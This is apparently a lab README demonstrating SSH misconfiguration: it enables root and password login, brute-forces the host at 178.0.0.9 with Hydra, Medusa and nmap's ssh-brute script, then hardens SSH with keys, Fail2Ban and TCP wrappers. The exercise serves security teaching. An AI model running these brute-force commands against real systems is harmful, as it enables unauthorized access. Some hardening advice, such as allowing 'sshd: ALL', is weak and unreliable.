# POC-TASKS

# ðŸ“Œ Linux Security - Exploitation & Hardening (PoC)

This repository demonstrates **Remote Access (SSH) misconfigurations**, including **exploitation and mitigation**.

---

## ðŸ”¹ **Task 2: Remote Access & SSH Hardening**

### âœ… **Setup: Enabling SSH & Allowing Root Login**

```bash
# Install OpenSSH server and enable SSH
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo apt update && sudo apt install openssh-server -y
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl enable --now ssh

# Allow root login (INSECURE!) and enable password authentication
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH to apply changes
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl restart ssh
```

---

### âœ… **Exploitation: Brute-Force Attack on SSH**

```bash
# Using Hydra for brute force attack
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo apt install -y hydra
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ hydra -l root -P passwords.txt ssh://178.0.0.9 -t 4

# Using Medusa for brute force attack
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo apt install -y medusa
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ medusa -h 178.0.0.9 -u root -P passwords.txt -M ssh -n 22

# Using Nmap to detect open SSH port
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo apt install -y nmap
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ nmap -p 22 178.0.0.9 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt
```

---

### âœ… **Mitigation: Hardening SSH Security**

```bash
# Disable root login and enforce key-based authentication
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config

# Generate SSH key pair
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ssh-keygen -t rsa -b 4096
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ ssh-copy-id user@178.0.0.9

# Restart SSH to apply changes
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl restart ssh
```

---

### âœ… **Mitigation: Prevent Brute-Force Attacks with Fail2Ban**

```bash
# Install and configure Fail2Ban
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo apt install -y fail2ban
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo bash -c 'cat <<EOL > /etc/fail2ban/jail.local
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 600
EOL'

# Restart Fail2Ban
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl restart fail2ban
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo fail2ban-client status sshd
```

---

### ðŸ”¥ **Additional Hardening Techniques:**

```bash
# Set a custom SSH port (e.g., 2222)
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl restart ssh

# Implement TCP Wrappers
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ echo 'sshd: ALL' | sudo tee -a /etc/hosts.allow
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ echo 'ALL: ALL' | sudo tee -a /etc/hosts.deny

# Disable empty passwords
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo sed -i 's/PermitEmptyPasswords yes/PermitEmptyPasswords no/' /etc/ssh/sshd_config
â”Œâ”€â”€(kaliã‰¿kali)-[~]
â””â”€$ sudo systemctl restart ssh
```

---

### ðŸ“‚ **Task 2 - Summary**

| **Step**                   | **Action**                                | **Command**                                                                                                             |                                                   |                               |
| -------------------------- | ----------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- | ----------------------------- |
| ðŸ”¹ **Setup**               | Install & start SSH                       | `sudo apt update && sudo apt install -y openssh-server``sudo systemctl enable ssh``sudo systemctl start ssh`            |                                                   |                               |
|                            | Allow root login (INSECURE)               | `sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config`                          |                                                   |                               |
|                            | Enable password authentication (INSECURE) | `sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config`                            |                                                   |                               |
|                            | Restart SSH to apply changes              | `sudo systemctl restart ssh`                                                                                            |                                                   |                               |
| ðŸ”¹ **Exploitation**        | Hydra Brute-Force Attack                  | `hydra -l root -P passwords.txt ssh://178.0.0.9 -t 4`                                                                   |                                                   |                               |
|                            | Medusa Brute-Force Attack                 | `medusa -h 178.0.0.9 -u root -P passwords.txt -M ssh -n 22`                                                             |                                                   |                               |
|                            | Nmap SSH Enumeration                      | `nmap -p 22 178.0.0.9 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt`                           |                                                   |                               |
| ðŸ”¹ **Mitigation**          | Disable root login (SECURE)               | `sudo sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config`                                          |                                                   |                               |
|                            | Enforce Key-Based Authentication          | `ssh-keygen -t rsa -b 4096``ssh-copy-id user@178.0.0.9`                                                                 |                                                   |                               |
|                            | Disable Password Authentication           | `sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config`                            |                                                   |                               |
|                            | Set Custom SSH Port                       | `sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config`                                                              |                                                   |                               |
|                            | Implement TCP Wrappers                    | \`echo 'sshd: ALL'                                                                                                      | sudo tee -a /etc/hosts.allow`<br>`echo 'ALL: ALL' | sudo tee -a /etc/hosts.deny\` |
| ðŸ”¹ **Prevent Brute-Force** | Install Fail2Ban                          | `sudo apt install -y fail2ban`                                                                                          |                                                   |                               |
|                            | Configure Fail2Ban for SSH                | \`echo -e "[sshd]\nenabled = true\nport = ssh\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 5\nbantime = 600" | sudo tee /etc/fail2ban/jail.local\`               |                               |
|                            | Restart Fail2Ban                          | `sudo systemctl restart fail2ban`                                                                                       |                                                   |                               |
|                            | Check Fail2Ban SSH protection             | `sudo fail2ban-client status sshd`                                                                                      |                                                   |                               |

---

### END -x-

